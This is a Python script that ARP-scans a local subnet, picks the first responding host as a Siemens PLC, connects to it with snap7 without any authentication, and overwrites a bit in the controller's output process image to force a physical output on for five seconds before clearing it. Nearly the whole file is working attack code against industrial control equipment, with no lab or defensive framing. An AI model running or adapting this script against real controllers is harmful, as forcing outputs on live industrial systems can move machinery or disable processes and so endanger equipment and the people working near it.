import snap7
from scapy.all import ARP, Ether, srp
import struct
import time

# Define network parameters for scanning (Modify based on your subnet)
SUBNET = "192.168.1.0/24"  # Adjust this to reflect the correct subnet

def find_plc_ip():
    """Scans the subnet to find a Siemens PLC based on ARP responses."""
    print("[*] Scanning for PLC in the network...")
    
    arp_request = ARP(pdst=SUBNET)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_request

    answered_list = srp(arp_packet, timeout=2, verbose=False)[0]
    
    for sent, received in answered_list:
        # You may filter by OUI if PLC has a fixed MAC vendor prefix
        print(f"[*] Potential PLC found at: {received.psrc}")
        return received.psrc  # Return the first found IP

    print("[!] No PLC found.")
    return None

def connect_to_plc(plc_ip):
    """Establishes connection to the PLC using Snap7."""
    plc = snap7.client.Client()
    
    try:
        plc.connect(plc_ip, 0, 1)  # Typical for Siemens PLCs (RACK=0, SLOT=1)
        print(f"[+] Connected to PLC at {plc_ip}")
        return plc
    except Exception as e:
        print(f"[!] Failed to connect to PLC: {e}")
        return None

def force_output(plc, byte_offset, bit_offset, new_state):
    """
    Manipulates I/O image by changing an output at the specified byte and bit offset.
    
    - `byte_offset`: The byte index in the Output memory area.
    - `bit_offset`: The bit index within the byte.
    - `new_state`: Desired state (1 = ON, 0 = OFF).
    """
    
    area = snap7.types.Areas.PE  # Output process image (Q area in Siemens PLCs)
    count = 1  # Reading a single byte

    print(f"[*] Reading current output byte at offset {byte_offset}...")
    data = plc.read_area(area, 0, byte_offset, count)
    
    output_byte = struct.unpack("B", data)[0]

    # Modify the specific bit
    if new_state:
        output_byte |= (1 << bit_offset)  # Set bit to 1
    else:
        output_byte &= ~(1 << bit_offset)  # Clear bit to 0

    # Pack the byte back
    modified_data = struct.pack("B", output_byte)

    print(f"[*] Writing modified output byte (forcing bit {bit_offset} to {new_state})...")
    plc.write_area(area, 0, byte_offset, modified_data)

def main():
    plc_ip = find_plc_ip()
    
    if not plc_ip:
        print("[!] No PLC found. Exiting.")
        return
    
    plc = connect_to_plc(plc_ip)

    if not plc:
        print("[!] Could not establish a connection with the PLC.")
        return

    try:
        byte_offset = 0  # Adjust based on your I/O configuration
        bit_offset = 0   # The specific bit in the byte that controls the output
        new_state = 1    # 1 = Force ON, 0 = Force OFF

        force_output(plc, byte_offset, bit_offset, new_state)
        
        time.sleep(5)  # Maintain the forced state for 5 seconds
        
        new_state = 0  # Reset the change (optionally)
        force_output(plc, byte_offset, bit_offset, new_state)
    
    finally:
        plc.disconnect()
        print("[+] Disconnected from PLC.")

if __name__ == "__main__":
    main()